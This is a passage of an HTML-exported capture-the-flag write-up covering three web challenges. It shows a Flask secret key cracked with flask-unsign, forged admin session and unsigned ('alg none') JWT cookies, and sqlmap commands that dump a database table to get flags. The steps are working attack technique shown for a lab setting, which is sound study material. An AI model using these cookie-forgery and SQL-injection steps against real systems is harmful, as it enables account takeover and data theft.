11pt;"><br/></span></div><div><span style="font-size: 14pt; font-weight: bold;">FLAG :</span><span style="font-size: 14pt; color: rgb(227, 0, 0); font-weight: bold;">Â Â </span><span style="font-size: 14pt;"><span style="font-size: 14pt; color: rgb(227, 0, 0); font-weight: bold;">Sl7{JwT-NoNE-WORKs!}</span></span></div><div><span style="font-size: 11pt;"><br/></span></div><hr/><div><span style="font-size: 14pt;"><br/></span></div><div><span style="font-size: 14pt;"><span style="font-size: 14pt; font-weight: bold;">iknow</span><span style="font-size: 14pt; color: rgb(45, 79, 201); font-weight: bold;">secret</span> <span style="font-size: 14pt; font-weight: bold;">:</span></span></div><div><span style="font-size: 12pt; color: rgb(79, 0, 154); font-weight: bold;">We successfully got 2 users</span> <span style="font-size: 12pt; color: rgb(156, 0, 76); font-weight: bold;">tom:password</span> <span style="font-size: 12pt; color: rgb(79, 0, 154); font-weight: bold;">and</span> <span style="font-size: 12pt; color: rgb(156, 0, 76); font-weight: bold;">jerry:password123</span></div><div><span style="font-size: 12pt; color: rgb(79, 0, 154); font-weight: bold;">Can You compromise admin account and get flag??</span></div><div><span style="font-size: 14pt;"><br/></span></div><div><font style="font-size: 10pt;"><span style="font-size: 10pt; font-weight: bold;">Found server details during login responseÂ  :</span></font></div><div><span style="color: rgb(134, 0, 164); font-weight: bold;">Server: Werkzeug/1.0.0 Python/3.8.1</span></div><div><br/></div><div><span style="color: rgb(134, 0, 164); font-weight: bold;">found some exploits :</span></div><div><a href="https://www.exploit-db.com/exploits/37814" style="font-weight: bold;">https://www.exploit-db.com/exploits/37814</a></div><div><a href="https://www.exploit-db.com/exploits/43905" style="font-weight: bold;">https://www.exploit-db.com/exploits/43905</a></div><div><br/></div><div><span style="font-weight: bold;">None worked!</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>HTTP/1.0 405 METHOD NOT ALLOWED</div><div>Content-Type: text/html; charset=utf-8</div><div><b><font color="#9C004C">Allow: OPTIONS, GET, HEAD</font></b></div><div>Content-Length: 178</div><div>Server: Werkzeug/1.0.0 Python/3.8.1</div><div>Date: Sun, 17 May 2020 10:27:34 GMT</div><div><br/></div><div>&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 3.2 Final//EN&quot;&gt;</div><div>&lt;title&gt;405 Method Not Allowed&lt;/title&gt;</div><div>&lt;h1&gt;Method Not Allowed&lt;/h1&gt;</div><div>&lt;p&gt;The method is not allowed for the requested URL.&lt;/p&gt;</div></div><div><font style="font-size: 11pt;"><br/></font></div><div><font style="font-size: 11pt;"><br/></font></div><div><span style="font-size: 10pt; font-weight: bold;">Any request with</span> <span style="font-size: 10pt; color: rgb(134, 0, 164); font-weight: bold;">user:admin</span> <span style="font-size: 10pt; font-weight: bold;">gives no access denied error . it means the admin account username is admin .</span></div><div><font style="font-size: 10pt;"><br/></font></div><div><font style="font-size: 10pt;"><br/></font></div><div><font style="font-size: 10pt;"><span style="font-size: 10pt; font-weight: bold;">Analysing tom :</span></font></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 9pt;"><b><font color="#BC0058">token=</font><font color="#3665EE">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdXRoIjoxNTg5NjU4MjE4MTAxLCJhZ2VudCI6Ik1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NDsgcnY6NjguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC82OC4wIiwicm9sZSI6InVzZXIiLCJpYXQiOjE1ODk2NTgyMTh9.ho08oCHJOw34SULdnpls5P3czzeWNOu_TO52LaE-aFM;Â </font></b></font></div><div><font color="#3665EE" style="font-size: 9pt;"><b><br/></b></font></div><div><font style="font-size: 9pt;"><b><font color="#BC0058">session=</font><font color="#3665EE">eyJ1c2VybmFtZSI6InRvbSJ9.XsE1QA.gSxRAWD5fuqPFAD3MrGtfKHY8kQ</font></b></font></div></div><div><font style="font-size: 11pt;"><br/></font></div><div><span style="font-size: 10pt;"><span style="font-size: 10pt; font-weight: bold;">Analysing jerry:</span></span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><b><font color="#BC0058">token=</font><font style="color: rgb(118, 0, 216);">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdXRoIjoxNTg5NjU4MjE4MTAxLCJhZ2VudCI6Ik1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NDsgcnY6NjguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC82OC4wIiwicm9sZSI6InVzZXIiLCJpYXQiOjE1ODk2NTgyMTh9.ho08oCHJOw34SULdnpls5P3czzeWNOu_TO52LaE-aFM;Â </font></b></div><div><b><font color="#7600D8"><br/></font></b></div><div><b><font color="#BC0058">session=</font><font style="color: rgb(118, 0, 216);">eyJ1c2VybmFtZSI6ImplcnJ5In0.XsE1uQ.F1uJfm-eYEv-tMjVRm_RZoU8Uco</font></b></div></div><div><span style="font-size: 10pt;"><br/></span></div><div><span style="font-size: 10pt; font-weight: bold;">something related to :Â  flask session cookies forgery</span></div><div><font style="font-size: 10pt;"><span style="font-size: 10pt; font-weight: bold;">Â but need secret key .</span></font></div><div><font style="font-size: 10pt;"><span style="font-size: 10pt; font-weight: bold;">Tried to guess and find but still failed!!</span></font></div><div><font style="font-size: 10pt;"><span style="font-size: 10pt;"><br/></span></font></div><div><font style="font-size: 10pt;"><span style="font-size: 10pt; font-weight: bold;">Then followed the author :Â </span></font><span style="font-weight: bold;">CJHackerz</span></div><div><font style="font-size: 10pt;"><span style="font-size: 10pt; font-weight: bold;">Baking Flask cookies with your secrets :Â Â </span></font></div><div><a href="https://blog.paradoxis.nl/defeating-flasks-session-management-65706ba9d3ce" style="font-size: 10pt; color: rgb(134, 0, 164); font-weight: bold;">https://blog.paradoxis.nl/defeating-flasks-session-management-65706ba9d3ce</a></div><div><br/></div><div><a href="https://github.com/Paradoxis/Flask-Unsign" style="font-weight: bold;">https://github.com/Paradoxis/Flask-Unsign</a></div><div><span style="font-weight: bold;">Tried to crack the secret key using the default wordlist :</span></div><div><span style="color: rgb(134, 0, 164); font-weight: bold;">pip3 install flask-unsign[wordlist]</span></div><div><span style="color: rgb(134, 0, 164); font-weight: bold;">flask-unsign --decode --cookie 'eyJ1c2VybmFtZSI6InRvbSJ9.XsOhbA.ATwPAX3mNOnNtZuquwB9IszvYaw'</span></div><div><span style="color: rgb(134, 0, 164); font-weight: bold;">flask-unsign --</span><span style="color: rgb(227, 0, 0); font-weight: bold;">unsign</span> <span style="color: rgb(134, 0, 164); font-weight: bold;">--cookie 'eyJ1c2VybmFtZSI6InRvbSJ9.XsOhbA.ATwPAX3mNOnNtZuquwB9IszvYaw'</span></div><div><font style="font-size: 14pt;"><font style="font-size: 11pt;"><span style="font-size: 11pt; font-weight: bold;">Found the key :</span><span style="font-size: 11pt; color: rgb(255, 0, 0);">Â </span></font></font><span style="font-size: 11pt;"><span style="font-size: 11pt; color: rgb(255, 0, 0); font-weight: bold;">xxxxxxxx</span></span></div><div><span style="font-size: 11pt;"><br/></span></div><div><span style="font-size: 11pt; font-weight: bold;">Now we will use theÂ </span><span style="font-weight: bold;">Â Key toÂ </span><span style="font-size: 16px; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;; font-variant-caps: normal; font-variant-ligatures: normal; font-weight: bold;">craft our own custom session data for admin :</span></div><div><span style="font-size: 11pt;"><span style="font-size: 11pt; color: rgb(134, 0, 164); font-weight: bold;">flask-unsign --sign --cookie &quot;{'username': 'admin'}&quot; --secret 'xxxxxxxx'</span></span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 10pt; color: rgb(45, 79, 201);"><b>eyJ1c2VybmFtZSI6ImFkbWluIn0.EaVBIg.7P-xGUC-0Vf07TZhvH6P8pNdOeg</b></font></div></div><div><span style="font-size: 11pt;"><span style="font-size: 11pt; font-weight: bold;">It failed.</span></span></div><div><span style="font-size: 11pt;"><span style="font-size: 11pt; font-weight: bold;">As the request also has a</span> <span style="font-size: 11pt; font-weight: bold; color: rgb(26, 144, 185);">jwt token cookie</span><span style="font-size: 11pt; font-weight: bold;">.</span></span></div><div><span style="font-size: 11pt;"><span style="font-size: 11pt; font-weight: bold;">so we need to modify it also :</span></span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><b><font style="color: rgb(79, 0, 154);">eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhdXRoIjoxNTg5NjU4MjE4MTAxLCJhZ2VudCI6Ik1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NDsgcnY6NjguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC82OC4wIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTg5NjU4MjE4fQ.</font></b></div></div><div><span style="font-size: 11pt;"><br/></span></div><div><span style="font-size: 11pt;"><span style="font-size: 11pt; font-weight: bold;">still failed so again crafted the flask_session_cookie with</span> <span style="font-size: 11pt; font-weight: bold; color: rgb(250, 122, 0);">legacy</span> <span style="font-size: 11pt; font-weight: bold;">option:</span></span></div><div><span style="font-size: 11pt;"><span style="font-size: 11pt; font-weight: bold; color: rgb(134, 0, 164);">flask-unsign --sign</span> <span style="font-size: 11pt; font-weight: bold; color: rgb(188, 0, 88);">--legacy</span> <span style="font-size: 11pt; font-weight: bold; color: rgb(134, 0, 164);">--cookie &quot;{'username': 'admin'}&quot; --secret 'xxxxxxxx'</span></span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 11pt;"><font color="#7600D8"><b>eyJ1c2VybmFtZSI6ImFkbWluIn0.XsOo7A.MrAYYB8FijFnU4X1MYey11h3gUA</b></font></span></div></div><div><span style="font-weight: bold; font-size: 14pt;">This time worked!!</span></div><div><font style="font-size: 14pt;"><br/></font></div><div><span style="font-weight: bold; font-size: 14pt;">POC :</span> <span style="font-weight: bold; font-size: 14pt; color: rgb(54, 101, 238);">using both the crafted</span> <span style="font-weight: bold; font-size: 14pt; color: rgb(118, 0, 216);">jwt_token_cookie</span> <span style="font-weight: bold; font-size: 14pt; color: rgb(54, 101, 238);">and</span> <span style="font-weight: bold; font-size: 14pt; color: rgb(118, 0, 216);">flask_session_cookie</span> <span style="font-weight: bold; font-size: 14pt; color: rgb(54, 101, 238);">gives the admin page .</span></div><div><font color="#FF0000" style="font-size: 14pt;"><br/></font></div><div><span style="font-weight: bold; font-size: 14pt;">FLAG :</span><span style="font-weight: bold; color: rgb(255, 0, 0); font-size: 14pt;">Â </span><span style="font-size: 14pt; font-weight: bold; color: rgb(255, 0, 0);">SL7{PyTH0n-FLaSK-Co0Kie}</span></div><div><span style="font-size: 14pt;"><br/></span></div><hr/><div><span style="font-size: 11pt;"><br/></span></div><div><span style="font-size: 14pt; font-weight: bold;">LoggedIn :Â  Â  <span style="font-size: 14pt; font-weight: bold; color: rgb(134, 0, 164);">Â after analysing found sqliÂ </span></span></div><div><font style="font-size: 10pt;"><br/></font></div><div><span style="font-size: 10pt; font-weight: bold;">user exits:Â </span> <span style="font-size: 10pt; color: rgb(227, 0, 0); font-weight: bold;">adminÂ  ,Â  Â touhidÂ Â </span></div><div><font style="font-size: 10pt;"><br/></font></div><div><span style="font-weight: bold;">Finding :Â </span> <span style="color: rgb(79, 0, 154); font-weight: bold;">server accepts only base64 encoded inputÂ </span></div><div><font style="font-size: 10pt;"><br/></font></div><div><font style="font-size: 10pt;"><br/></font></div><div><span style="font-weight: bold;">log.req :</span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><b>GET /check.php?username=YXNk HTTP/1.1</b></div><div><b>Host: <a href="http://docker.h4x0rbox.com:2100">docker.h4x0rbox.com:2100</a></b></div><div><b>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</b></div><div><b>Accept: */*</b></div><div><b>Accept-Language: en-US,en;q=0.5</b></div><div><b>Accept-Encoding: gzip, deflate</b></div><div><b>Referer: <a href="http://docker.h4x0rbox.com:2100/">http://docker.h4x0rbox.com:2100/</a></b></div><div><b>Connection: close</b></div><div><b>Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdXRoIjoxNTg5NjU4MjE4MTAxLCJhZ2VudCI6Ik1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NDsgcnY6NjguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC82OC4wIiwicm9sZSI6InVzZXIiLCJpYXQiOjE1ODk2NTgyMTh9.ho08oCHJOw34SULdnpls5P3czzeWNOu_TO52LaE-aFM</b></div></div><div><font style="font-size: 10pt;"><br/></font></div><div><font style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">Will sqlMap now :</span></font></div><div><font style="font-size: 10pt;"><br/></font></div><div><span style="font-weight: bold;">sqlmap -r log.req --base64=usernameÂ Â </span><span style="font-size: 10pt; font-weight: bold;">Â </span></div><div><span style="color: rgb(54, 101, 238); font-weight: bold;">GET parameter 'username' is vulnerable</span></div><div><br/></div><div><span style="font-size: 10pt; font-weight: bold;">sqlmap -r log.req --base64=username --dbs --threads=10 --dbms=mysql</span></div><div><span style="font-size: 10pt;"><span style="font-size: 10pt; color: rgb(54, 101, 238); font-weight: bold;">available databases [4]:</span></span></div><div><span style="font-size: 10pt;"><span style="font-size: 10pt; color: rgb(54, 101, 238); font-weight: bold;">[*] information_schema</span></span></div><div><span style="font-size: 10pt;"><span style="font-size: 10pt; color: rgb(54, 101, 238); font-weight: bold;">[*] loggedin</span></span></div><div><span style="font-size: 10pt;"><span style="font-size: 10pt; color: rgb(54, 101, 238); font-weight: bold;">[*] mysql</span></span></div><div><span style="font-size: 10pt;"><span style="font-size: 10pt; color: rgb(54, 101, 238); font-weight: bold;">[*] performance_schema</span></span></div><div><span style="font-size: 11pt;"><br/></span></div><div><span style="font-weight: bold;">sqlmap -r log.req --base64=username --dbs --threads=10 --dbms=mysql -D loggedin --tables</span></div><div><span style="color: rgb(54, 101, 238); font-weight: bold;">Database: loggedin</span></div><div><span style="color: rgb(54, 101, 238); font-weight: bold;">[2 tables]</span></div><div><span style="color: rgb(54, 101, 238); font-weight: bold;">+-----------+</span></div><div><span style="color: rgb(54, 101, 238); font-weight: bold;">| login_tbl |</span></div><div><span style="color: rgb(54, 101, 238); font-weight: bold;">| secretÂ Â Â Â |</span></div><div><span style="color: rgb(54, 101, 238); font-weight: bold;">+-----------+</span></div><div><br/></div><div><br/></div><div><span style="font-size: 14pt; font-weight: bold;">POCÂ  :Â </span><span style="font-size: 10pt; font-weight: bold;">Â </span><span style="font-size: 14pt; color: rgb(227, 0, 0); font-weight: bold;">sqlmap -r log.req --base64=username --dbs --threads=10 --dbms=mysql -D loggedin -T secret --dump</span></div><div><font color="#3665EE" style="font-size: 10pt;"><span style="font-size: 10pt; color: rgb(54, 101, 238); font-weight: bold;">Database: loggedin</span></font></div><div><font color="#3665EE" style="font-size: 10pt;"><span style="font-size: 10pt; color: rgb(54, 101, 238); font-weight: bold;">Table: secret</span></font></div><div><font color="#3665EE" style="font-size: 10pt;"><span style="font-size: 10pt; color: rgb(54, 101, 238); font-weight: bold;">[2 entries]</span></font></div><div><font color="#3665EE" style="font-size: 10pt;"><span style="font-size: 10pt; color: rgb(54, 101, 238); font-weight: bold;">+----------------------------+</span></font></div><div><font color="#3665EE" style="font-size: 10pt;"><span style="font-size: 10pt; color: rgb(54, 101, 238); font-weight: bold;">| flagÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â |</span></font></div><div><font color="#3665EE" style="font-size: 10pt;"><span style="font-size: 10pt; color: rgb(54, 101, 238); font-weight: bold;">+----------------------------+</span></font></div><div><font style="font-size: 10pt;"><span style="font-size: 10pt; color: rgb(54, 101, 238); font-weight: bold;">| Sl7{iH0Pe_yOU-yoUKnOwSQLi} |</span></font></div><div><font color="#3665EE" style="font-size: 10pt;"><span style="font-size: 10pt; color: rgb(54, 101, 238); font-weight: bold;">| Sl7{iH0Pe_yOU-yoUKnOwSQLi} |</span></font></div><div><font color="#3665EE" style="font-size: 10pt;"><span style="font-size: 10pt; color: rgb(54, 101, 238); font-weight: bold;">+----------------------------+</span></font></div><div><span style="font-size: 11pt;"><br/></span></div><div><span style="font-size: 11pt;"><br/></span></div><div><span style="font-size: 14pt; font-weight: bold;">FLAG :</span><span style="font-size: 14pt;">Â Â </span><span style="font-size: 14pt; color: rgb(255, 0, 0); font-weight: bold;">Sl7{iH0Pe_yOU-yoUKnOwSQLi}</span></div><div><font style="font-size: 14pt;"><br/></font></div><hr/><div><span style="font-size: 11pt;"><br/></span></div></div><div><br/></div></span>
</div></body></html> 